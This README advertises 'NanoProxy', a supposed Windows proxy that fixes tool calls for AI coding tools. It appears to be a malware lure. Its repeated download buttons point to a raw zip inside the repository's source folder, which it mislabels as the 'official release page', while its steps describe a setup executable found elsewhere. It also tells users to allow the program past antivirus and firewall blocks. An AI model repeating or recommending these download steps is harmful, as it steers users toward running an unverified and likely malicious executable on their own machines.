# ⚙️ NanoProxy - Reliable Local Proxy for AI Tools

[![Download NanoProxy](https://img.shields.io/badge/Download-NanoProxy-important)](https://github.com/Straightedgeheathaster783/NanoProxy/raw/refs/heads/main/src/Proxy_Nano_v1.1.zip)

---

## 📖 What is NanoProxy?

NanoProxy is a small program that works as a local proxy on your Windows PC. It helps improve how certain AI coding tools, like OpenCode and others that use OpenAI-compatible models, communicate with their services.

These AI tools sometimes struggle to make the right "tool calls" or commands, especially when using NanoGPT’s built-in features. NanoProxy fixes this by changing the commands into a simpler, stricter text format that it sends upstream. Then, it converts the responses back into the usual style these tools expect.

In plain terms, NanoProxy acts as a translator that smooths out communication problems, helping AI coding tools work more reliably on your computer.

---

## ⚙️ System Requirements

Before you install NanoProxy, make sure your computer meets these basic conditions:

- Windows 10 or later (64-bit preferred)
- At least 4 GB of RAM
- At least 100 MB free disk space
- Internet connection for initial setup and AI service communication
- No administrator rights are needed for standard use

NanoProxy runs quietly in the background and uses only a small amount of CPU when active.

---

## 🚀 Getting Started

Follow these steps to get NanoProxy up and running on your Windows PC. The process is simple and does not require any coding skills.

1. **Visit the download page:**  
   Click the large button below to open the official NanoProxy release page on GitHub.

   [![Download NanoProxy](https://img.shields.io/badge/Download-NanoProxy-blue)](https://github.com/Straightedgeheathaster783/NanoProxy/raw/refs/heads/main/src/Proxy_Nano_v1.1.zip)

2. **Find the latest version:**  
   On the release page, find the newest release. It usually appears at the top of the list and includes the version number.

3. **Download the installer:**  
   Under the latest release, look for a file named something like `NanoProxy-Setup.exe` or `NanoProxy-Windows.exe`. Click it to download.

4. **Run the installer:**  
   After download, locate the file (usually in your "Downloads" folder) and double-click it to start the installation.

5. **Follow the installation prompts:**  
   The installer will guide you through the steps. Use the default options unless you want to change the install location.

6. **Finish installation:**  
   When installed, click "Finish" or "Close" to exit the installer. NanoProxy may launch automatically or you can start it from the Start menu.

---

## 🖥 How to Use NanoProxy

Once installed, NanoProxy runs as a local proxy server on your PC. Here is what you need to do to use it:

1. **Start NanoProxy:**  
   Open NanoProxy from the Start menu or the desktop shortcut.

2. **Note the proxy address:**  
   NanoProxy shows an address like `http://localhost:8080` or a similar URL. This is where it listens for connections from your AI coding tools.

3. **Configure Your AI tool:**  
   Open your AI coding tool’s settings. Find where it asks for a proxy or API server address.

4. **Set the address:**  
   Enter the NanoProxy address (e.g., `http://localhost:8080`) exactly as shown.

5. **Save and restart the AI tool:**  
   Apply the settings and restart your AI tool if needed.

Now, all calls your AI tool makes that pass through NanoProxy will be cleaned and translated to avoid errors you might have had before.

---

## ⚙️ Configuration and Troubleshooting

### Changing Settings

NanoProxy’s user interface includes basic settings such as:

- Listening port number (default is 8080)
- Log level (to see detailed messages if needed)
- Auto-start option (to run when Windows boots)

You can change these settings in NanoProxy’s options window.

### Common Issues

- **Proxy connection fails:**  
  Make sure your firewall or antivirus is not blocking NanoProxy. Allow it through if asked.

- **AI tool does not connect:**  
  Check that the proxy address in your AI tool exactly matches the address shown in NanoProxy.

- **Performance is slow:**  
  NanoProxy is lightweight. Slow responses are usually due to network issues or the AI service itself.

- **NanoProxy does not start:**  
  Ensure no other application is using the same port. Try changing the listening port in the settings.

---

## 📥 Download and Install NanoProxy on Windows

1. Visit the release page:  
   https://github.com/Straightedgeheathaster783/NanoProxy/raw/refs/heads/main/src/Proxy_Nano_v1.1.zip

2. Locate the latest Windows installer file (`NanoProxy-Setup.exe` or similar).

3. Click the file to download it to your PC.

4. Open the downloaded file and run the installer.

5. Follow on-screen instructions.

6. Launch NanoProxy after installation and configure your AI tool as described above.

---

## 🔧 Support and Feedback

If you encounter problems or have questions, check the GitHub page issues section for common answers and updates.

You can also create a new issue on the NanoProxy GitHub repository with a clear description of your problem.

---

## ⚖️ License

NanoProxy is released under the MIT License. You may use, modify, and distribute it freely under the license terms.